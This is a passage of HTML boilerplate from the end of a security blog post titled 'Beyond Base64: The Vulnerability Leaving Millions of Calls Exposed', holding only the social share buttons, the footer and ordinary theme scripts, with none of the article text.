72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f&title=Beyond%20Base64%3a%20The%20Vulnerability%20Leaving%20Millions%20of%20Calls%20Exposed&summary=Beyond%20Base64%3a%20The%20Vulnerability%20Leaving%20Millions%20of%20Calls%20Exposed&source=https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed on reddit" href="https://reddit.com/submit?url=https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f&title=Beyond%20Base64%3a%20The%20Vulnerability%20Leaving%20Millions%20of%20Calls%20Exposed"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed on whatsapp" href="https://api.whatsapp.com/send?text=Beyond%20Base64%3a%20The%20Vulnerability%20Leaving%20Millions%20of%20Calls%20Exposed%20-%20https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Beyond Base64: The Vulnerability Leaving Millions of Calls Exposed on telegram" href="https://telegram.me/share/url?text=Beyond%20Base64%3a%20The%20Vulnerability%20Leaving%20Millions%20of%20Calls%20Exposed&url=https%3a%2f%2foffsec.space%2fposts%2fbeyond-base64%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://offsec.space/>Gaurang Bhatnagar</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>